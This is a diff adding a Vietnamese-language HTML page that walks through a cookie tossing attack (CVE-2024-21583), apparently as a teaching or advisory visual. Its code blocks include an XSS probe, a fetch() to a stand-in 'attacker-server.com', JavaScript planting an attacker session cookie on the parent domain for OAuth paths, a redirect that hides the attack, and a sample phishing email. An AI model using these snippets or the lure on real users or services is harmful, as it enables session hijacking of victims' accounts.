@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookie Tossing Attack - Detailed Steps</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .header {
+            text-align: center;
+            color: white;
+            margin-bottom: 40px;
+        }
+        .header h1 {
+            font-size: 2.8em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        .header p {
+            font-size: 1.2em;
+            opacity: 0.9;
+        }
+        .steps-container {
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+        }
+        .main-step {
+            background: white;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
+        }
+        .main-step-header {
+            background: #2c3e50;
+            color: white;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        .step-number {
+            background: #e74c3c;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5em;
+            font-weight: bold;
+        }
+        .step-title {
+            font-size: 1.4em;
+            font-weight: bold;
+        }
+        .sub-steps {
+            padding: 0;
+        }
+        .sub-step {
+            padding: 25px;
+            border-bottom: 1px solid #ecf0f1;
+            display: flex;
+            gap: 20px;
+            align-items: flex-start;
+        }
+        .sub-step:last-child {
+            border-bottom: none;
+        }
+        .sub-step-number {
+            background: #3498db;
+            color: white;
+            width: 35px;
+            height: 35px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            flex-shrink: 0;
+            margin-top: 5px;
+        }
+        .sub-step-content {
+            flex: 1;
+        }
+        .sub-step-content h4 {
+            color: #2c3e50;
+            margin-bottom: 10px;
+            font-size: 1.2em;
+        }
+        .sub-step-content p {
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 10px;
+        }
+        .code-block {
+            background: #2d3748;
+            color: #e2e8f0;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            overflow-x: auto;
+            border-left: 4px solid #e74c3c;
+        }
+        .domain-badge {
+            display: inline-block;
+            padding: 4px 12px;
+            background: #9b59b6;
+            color: white;
+            border-radius: 15px;
+            font-size: 0.8em;
+            margin: 0 3px;
+            font-family: monospace;
+        }
+        .malicious {
+            background: #e74c3c;
+        }
+        .victim {
+            background: #27ae60;
+        }
+        .note {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 0 8px 8px 0;
+        }
+        .impact {
+            background: #f8d7da;
+            border-left: 4px solid #dc3545;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 0 8px 8px 0;
+        }
+        .arrow {
+            text-align: center;
+            color: white;
+            font-size: 2em;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🍪 Cookie Tossing Attack</h1>
+            <p>Chi tiết từng bước tấn công với ví dụ thực tế</p>
+        </div>
+
+        <div class="steps-container">
+            
+            <!-- STEP 1 -->
+            <div class="main-step">
+                <div class="main-step-header">
+                    <div class="step-number">1</div>
+                    <div class="step-title">Kiểm soát Subdomain</div>
+                </div>
+                <div class="sub-steps">
+                    <div class="sub-step">
+                        <div class="sub-step-number">1.1</div>
+                        <div class="sub-step-content">
+                            <h4>Tìm Subdomain có thể khai thác</h4>
+                            <p>Kẻ tấn công tìm kiếm các subdomain cho phép user-generated content:</p>
+                            <div class="code-block">
+// Các subdomain tiềm năng<br>
+<span class="domain-badge">workspace123.gitpod.io</span><br>
+<span class="domain-badge">user-content.snyk.io</span><br>
+<span class="domain-badge">preview.herokuapp.com</span><br>
+<span class="domain-badge">sandbox.netlify.app</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="sub-step">
+                        <div class="sub-step-number">1.2</div>
+                        <div class="sub-step-content">
+                            <h4>Khai thác XSS hoặc Upload Content</h4>
+                            <p>Sử dụng lỗ hổng XSS hoặc tính năng upload file để triển khai mã độc:</p>
+                            <div class="code-block">
+// Khai thác XSS trên subdomain<br>
+https://vulnerable-subdomain.example.com/search?q=<br>&lt;script&gt;alert('XSS')&lt;/script&gt;<br><br>
+// Upload file HTML độc hại<br>
+https://user-content.platform.com/malicious-page.html
+                            </div>
+                        </div>
+                    </div>
+                    <div class="sub-step">
+                        <div class="sub-step-number">1.3</div>
+                        <div class="sub-step-content">
+                            <h4>Xác nhận Kiểm soát</h4>
+                            <p>Xác minh có thể thực thi JavaScript trên subdomain:</p>
+                            <div class="code-block">
+// Test script để xác nhận control<br>
+&lt;script&gt;<br>fetch('https://attacker-server.com/log?control=confirmed')<br>&lt;/script&gt;
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="arrow">⬇️</div>
+
+            <!-- STEP 2 -->
+            <div class="main-step">
+                <div class="main-step-header">
+                    <div class="step-number">2</div>
+                    <div class="step-title">Triển khai Cookie Độc hại</div>
+                </div>
+                <div class="sub-steps">
+                    <div class="sub-step">
+                        <div class="sub-step-number">2.1</div>
+                        <div class="sub-step-content">
+                            <h4>Tạo Session của Kẻ tấn công</h4>
+                            <p>Kẻ tấn công đăng nhập và lấy session ID hợp lệ từ tài khoản của họ:</p>
+                            <div class="code-block">
+// Session ID của kẻ tấn công<br>
+_gitpod_io_jwt2_ = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."<br><br>
+// Hoặc tạo session giả mạo<br>
+attacker_session = "attacker_1234567890abcdef"
+                            </div>
+                        </div>
+                    </div>
+                    <div class="sub-step">
+                        <div class="sub-step-number">2.2</div>
+                        <div class="sub-step-content">
+                            <h4>Viết JavaScript để Set Cookie</h4>
+                            <p>Tạo script thiết lập cookie trên domain cha với các path cụ thể:</p>
+                            <div class="code-block">
+// Script độc hại trên subdomain<br>
+document.cookie = "_gitpod_io_jwt2_=attacker_session;" +<br>
+                  "domain=.gitpod.io; " +<br>
+                  "path=/api/authorize; " +<br>
+                  "expires=" + new Date(Date.now() + 86400000).toUTCString();<br><br>
+// Set thêm cho callback endpoints<br>
+document.cookie = "_gitpod_io_jwt2_=attacker_session;" +<br>
+                  "domain=.gitpod.io; " +<br>
+                  "path=/auth/github/callback";
+                            </div>
+                        </div>
+                    </div>
+                    <div class="sub-step">
+                        <div class="sub-step-number">2.3</div>
+                        <div class="sub-step-content">
+                            <h4>Triển khai trên Subdomain</h4>
+                            <p>Đặt script độc hại lên subdomain đã kiểm soát:</p>
+                            <div class="code-block">
+// File: malicious-workspace.html<br>
+&lt;html&gt;<br>&lt;head&gt;<br>&lt;title&gt;Legitimate Workspace&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;script&gt;<br>// Cookie tossing code here<br>&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="arrow">⬇️</div>
+
+            <!-- STEP 3 -->
+            <div class="main-step">
+                <div class="main-step-header">
+                    <div class="step-number">3</div>
+                    <div class="step-title">Social Engineering & Phishing</div>
+                </div>
+                <div class="sub-steps">
+                    <div class="sub-step">
+                        <div class="sub-step-number">3.1</div>
+                        <div class="sub-step-content">
+                            <h4>Tạo URL Độc hại</h4>
+                            <p>Tạo link đến trang chứa mã độc được ngụy trang hợp lệ:</p>
+                            <div class="code-block">
+// URL độc hại được ngụy trang<br>
+https://awesome-project.gitpod.io<br>
+https://gitpod.io/#https://github.com/trending-repo/awesome-project<br>
+https://preview-team.snyk.io/dashboard
+                            </div>
+                        </div>
+                    </div>
+                    <div class="sub-step">
+                        <div class="sub-step-number">3.2</div>
+                        <div class="sub-step-content">
+                            <h4>Chuẩn bị Nội dung Lừa đảo</h4>
+                            <p>Tạo nội dung thuyết phục để lừa nạn nhân nhấp vào link:</p>
+                            <div class="code-block">
+// Email lừa đảo mẫu<br>
+Chủ đề: "Cần review code khẩn cấp"<br><br>
+Hi Team,<br><br>
+Có vấn đề nghiêm trọng trong repo production.<br>
+Vui lòng review ngay tại:<br>
+https://emergency-fix.gitpod.io<br><br>
+Thanks,<br>
+Tech Lead
+                            </div>
+                        </div>
+                    </div>
+                    <div class="sub-step">
+                        <div class="sub-step-number">3.3</div>
+                        <div class="sub-step-content">
+                            <h4>Phân phối Link</h4>
+                            <p>Gửi link độc hại qua các kênh khác nhau:</p>
+                            <div class="code-block">
+- Email nội bộ công ty<br>
+- Slack/Teams message<br>
+- GitHub issues/comments<br>
+- Code review requests<br>
+- Project management tools
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="arrow">⬇️</div>
+
+            <!-- STEP 4 -->
+            <div class="main-step">
+                <div class="main-step-header">
+                    <div class="step-number">4</div>
+                    <div class="step-title">Nạn nhân Truy cập & Cookie được Set</div>
+                </div>
+                <div class="sub-steps">
+                    <div class="sub-step">
+                        <div class="sub-step-number">4.1</div>
+                        <div class="sub-step-content">
+                            <h4>Nạn nhân Nhấp vào Link</h4>
+                            <p>Nạn nhân (đã đăng nhập vào ứng dụng chính) truy cập URL độc hại:</p>
+                            <div class="code-block">
+// Trình duyệt truy cập subdomain độc hại<br>
+GET https://malicious-workspace.gitpod.io<br><br>
+// Tải và thực thi JavaScript độc hại<br>
+// Cookie của kẻ tấn công được set trên domain cha
+                            </div>
+                        </div>
+                    </div>
+                    <div class="sub-step">
+                        <div class="sub-step-number">4.2</div>
+                        <div class="sub-step-content">
+                            <h4>Cookie được Thiết lập</h4>
+                            <p>Trình duyệt lưu cookie của kẻ tấn công cho domain cha:</p>
+                            <div class="code-block">
+// Cookies trên trình duyệt nạn nhân<br>
+Name: _gitpod_io_jwt2_<br>
+Value: attacker_session_id<br>
+Domain: .gitpod.io<br>
+Path: /api/authorize<br>
+Expires: 1 ngày<br><br>
+Name: _gitpod_io_jwt2_<br>
+Value: attacker_session_id<br>
+Domain: .gitpod.io<br>
+Path: /auth/github/callback
+                            </div>
+                        </div>
+                    </div>
+                    <div class="sub-step">
+                        <div class="sub-step-number">4.3</div>
+                        <div class="sub-step-content">
+                            <h4>Redirect về Trang Hợp lệ</h4>
+                            <p>Sau khi set cookie, redirect nạn nhân về trang hợp lệ để tránh nghi ngờ:</p>
+                            <div class="code-block">
+// Redirect sau khi set cookie<br>
+window.location.href = "https://gitpod.io/dashboard";<br><br>
+// Hoặc hiển thị trang lỗi giả mạo<br>
+document.body.innerHTML = "Workspace không khả dụng...";
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="arrow">⬇️</div>
+
+            <!-- STEP 5 -->
+            <div class="main-step">
+                <div class="main-step-header">
+                    <div class="step-number">5</div>
+                    <div class="step-title">Kích hoạt Luồng OAuth</div>
+                </div>
+                <div class="sub-steps">
+                    <div class="sub-step">
+                        <div class="sub-step-number">5.1</div>
+                        <div class="sub-step-content">
+                            <h4>Nạn nhân Thực hiện Hành động OAuth</h4>
+                            <p>Nạn nhân thực hiện hành động cần xác thực OAuth:</p>
+                            <div class="code-block">
+// Các hành động phổ biến<br>
+- Kết nối tài khoản GitHub<br>
+- Đăng nhập qua Google OAuth<br>
+- Authorize ứng dụng third-party<br>
+- Truy cập API cần xác thực
+                            </div>
+                        </div>
+                    </div>
+                    <div class="sub-step">
+                        <div class="sub-step-number">5.2</div>
+                        <div class="sub-step-content">
+                            <h4>Request đến OAuth Endpoint</h4>
+                            <p>Trình duyệt gửi request đến endpoint OAuth với cookie của kẻ tấn công:</p>
+                            <div class="code-block">
+// Request đến authorize endpoint<br>
+GET /api/authorize?<br>response_type=code<br>&client_id=gitpod<br>&redirect_uri=https://gitpod.io/auth/github/callback<br>&state=random_string<br><br>
+Cookie: _gitpod_io_jwt2_=attacker_session_id
+                            </div>
+                        </div>
+                    </div>
+                    <div class="sub-step">
+                        <div class="sub-step-number">5.3</div>
+                        <div class="sub-step-content">
+                            <h4>Server Xử lý với Session Attacker</h4>
+                            <p>Server sử dụng session của kẻ tấn công thay vì session thật của nạn nhân:</p>
+                            <div class="code-block">
+// Server xác thực session<br>
+Session ID: attacker_session_id → Tài khoản Attacker<br><br>
+// Thay vì:<br>
+Session ID: victim_session_id → Tài khoản Victim
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <div style="text-align: center; margin-top: 40px; color: white;">
+            <p><strong>CVE-2024-21583</strong> • Discovered: 26/06/2024 • Fixed: 01/07/2024</p>
+        </div>
+    </div>
+</body>
+</html>
